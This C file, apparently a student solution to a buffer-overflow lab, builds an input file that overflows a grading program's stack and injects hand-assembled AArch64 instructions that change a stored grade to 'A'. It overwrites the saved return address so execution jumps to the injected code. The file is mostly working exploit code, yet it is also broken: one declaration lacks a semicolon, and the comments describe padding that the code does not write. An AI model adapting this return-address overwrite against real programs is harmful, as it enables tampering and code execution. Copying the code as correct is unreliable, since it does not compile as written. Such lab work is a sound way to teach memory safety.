/*
Produces a file called dataA with the student name, nullbyte(s),
instructions to change the grade to an "A", padding to overrun the
stack, and the address of the first print instruction in main, the
latter of which will overwrite getName's stored x30.
*/

#include <stdio.h>
#include "miniassembler.h"

/*
reads in a name w/ length of up to 31 chars from stdin, truncating
beyond 31 chars. creates file dataA. in dataA, writes the name
terminated with a nullbyte, pads with nullbytes to ensure instrs are
4-byte aligned, writes the instrs for the attack, pads with '0's as
necessary, then finally writes the address of the first print instr
in main. returns 0
*/

int main(void) {
    char pcInject[47] = "Angeline Yan and Jade Sceats";
    int i = 0;
    int iNameLength = 4
    unsigned long uiTargetAddr = 0x400890;
    unsigned int uiAdr, uiMov, uiStrb, uiB;
    FILE *psFile;

    psFile = fopen("dataA", "w");
    /* write name */
    fwrite(pcInject, sizeof(char), iNameLength, psFile);
    /* write instructions */
    /* load grade instr (0x420044 is addr of grade, 0x420058 + i is addr
    of this instruction) */
    uiAdr = MiniAssembler_adr(0, 0x420044, 0x420058 + iNameLength);
    fwrite(&uiAdr, sizeof(unsigned int), 1, psFile);
    /* get "A" instr */
    uiMov = MiniAssembler_mov(1, 0x41);
    fwrite(&uiMov, sizeof(unsigned int), 1, psFile);
    /* set "A" instr */
    uiStrb = MiniAssembler_strb(1, 0);
    fwrite(&uiStrb, sizeof(unsigned int), 1, psFile);
    i = i + 12;
    /* branch to print instr (0x40089c is addr of print instr in main,
    0x420058 + i is addr of this instr) */
    uiB = MiniAssembler_b(0x40089c, 0x420058 + i);
    fwrite(&uiB, sizeof(unsigned int), 1, psFile);
    i = i + 4;

    /* pad as necessary */
    for (; i < 48; i++) {
        fprintf(psFile, "%c", 0x30);
    }

    /* overwrite getName's x30 with addr of inject code in bss */
    uiTargetAddr = 0x420058 + iNameLength;
    fwrite(&uiTargetAddr, sizeof(unsigned long), 1, psFile);
    fclose(psFile);

    return 0;
}
